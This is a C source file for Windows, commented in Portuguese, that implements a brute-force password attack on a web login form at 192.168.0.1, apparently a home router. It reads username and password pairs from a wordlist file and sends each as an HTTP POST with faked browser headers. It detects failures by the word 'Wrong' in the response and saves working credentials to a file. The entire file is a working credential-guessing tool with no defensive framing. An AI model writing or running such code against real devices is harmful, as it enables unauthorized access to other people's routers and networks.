#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <synchapi.h>
#include <string.h>
#include <windows.h>

#include "string_handling.h"

#define HOSTIP "192.168.0.1"

void getUserPassword(int index, char* user, char* pass);
int getPasswordsCount();

int main(int argc, char *argv[]) {
	SOCKET s;
	WSADATA wsa;
	
	if(WSAStartup(MAKEWORD(2, 2), &wsa) != 0){
		fprintf(stderr, "Erro ao inicializar WSA");
		return -1;
	}
	
	struct addrinfo hints;
	memset(&hints, 0, sizeof(hints));
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;
	
	struct addrinfo *addr;
	getaddrinfo(HOSTIP, "80", &hints, &addr);
	
	char *bufferIn = malloc(1024);
	char *bufferOut = malloc(1024);
	
	char *user = malloc(64);
	char *pass = malloc(64);
	char *content = malloc(256);
	
	char *str_linha = malloc(128);
	
	int quantidade_passwords = getPasswordsCount();
	int i;
	for(i = 0; i < quantidade_passwords; i++){
		s = socket(addr->ai_family, addr->ai_socktype, addr->ai_protocol);
		
		if(s == INVALID_SOCKET){
			fprintf(stderr, "Erro ao criar socket");
			return -1;
		}
		
		if(connect(s, addr->ai_addr, addr->ai_addrlen) != 0){
			fprintf(stderr, "Erro ao tentar conectar");
			return -1;
		}

		
		memset(user, 0, 64);
		memset(pass, 0, 64);
		memset(content, 0, 256);
		
		
		getUserPassword(i, user, pass);
		
		printf("Password: %s\n\n", pass);
		
		sprintf(content, "user=%s&passwd=%s&post_url=cgi_index.", user, pass);
	
		//SEND CONTENT
		memset(bufferOut, 0, 1024);
		sprintf(bufferOut, 
		"POST / HTTP/1.1\r\n"
		"Host: 192.168.0.1\r\n"
		"Connection: keep-alive\r\n"
		"Content-Length: %d\r\n"
		"Cache-Control: max-age=0\r\n"
		"Upgrade-Insecure-Requests: 1\r\n"
		"Origin: http://192.168.0.1\r\n"
		"Content-Type: application/x-www-form-urlencoded\r\n"
		"User-Agent: Mozilla/5.0 (Solaris)\r\n"
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n"
		"Referer: http://192.168.0.1\r\n"
		"Accept-Encoding: gzip, deflate\r\n"
		"Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7\r\n\r\n"
		"%s",
		strlen(content), content);
		
		send(s, bufferOut, strlen(bufferOut), 0);
	
		memset(bufferIn, 0, 1024);
		if(recv(s, bufferIn, 512, 0) == 0){
			fprintf(stderr, "\n\nErro ao receber dados\n");
			getch();
			return -1;
		}
		
		//ATIVAR PARA VER RESPOSTA
		//printf("%s", bufferIn);
		
		
		//memset(str_linha, 0, 128);
		//strcpy(str_linha, _split(bufferIn, '\n', 0));
	
		//printf("\n\n%s\n\n", str_linha);
	
		if(instr(0, bufferIn, "Wrong") > -1){
			FILE *arq = fopen("relatorio.txt", "a");
			fprintf(arq, "%s\t%s\t[ACESSO NEGADO]\n", user, pass);
			fclose(arq);
			printf("\n\n[ACESSO NEGADO]\n\n");
		}
		else{
			FILE *arq = fopen("relatorio.txt", "a");
			fprintf(arq, "%s\t%s\t[ACESSO AUTORIZADO]\n", user, pass);
			fclose(arq);
			
			arq = fopen("senhas encontradas.txt", "a");
			fprintf(arq, "%s\t%s\t[ACESSO AUTORIZADO]\n", user, pass);
			fclose(arq);
			
			printf("\n\n[ACESSO AUTORIZADO]\n\n");
		}
	
		closesocket(s);
		
		sleep(3);
	}
	
	WSACleanup();
	
	return 0;
}

int getPasswordsCount(){
	FILE *arq;
	arq = fopen("pass.txt", "r");
	char c;
	int ret = 1;
	while((c = getc(arq)) != EOF){
		if(c == '\n')
			ret ++;
	}
	
	fclose(arq);
	return ret;
}

void getUserPassword(int index, char* user, char* pass){
	FILE *arq;
	arq = fopen("pass.txt", "r");
	char c;
	char* buffer = malloc(64);
	
	memset(buffer, 0, 64);
	
	int linha = 0;
	int caracter_linha = 0;
	while((c = getc(arq)) != EOF){
		if(linha == index){
			if(c == '\n')
				break;
				
			*(buffer + caracter_linha) = c;
			caracter_linha ++;
		}
		
		if(c == '\n')
			linha ++;
	}
	
	fclose(arq);
		
	strcpy(user, _split(buffer, 9, 0));
	strcpy(pass, _split(buffer, 9, 1));
}
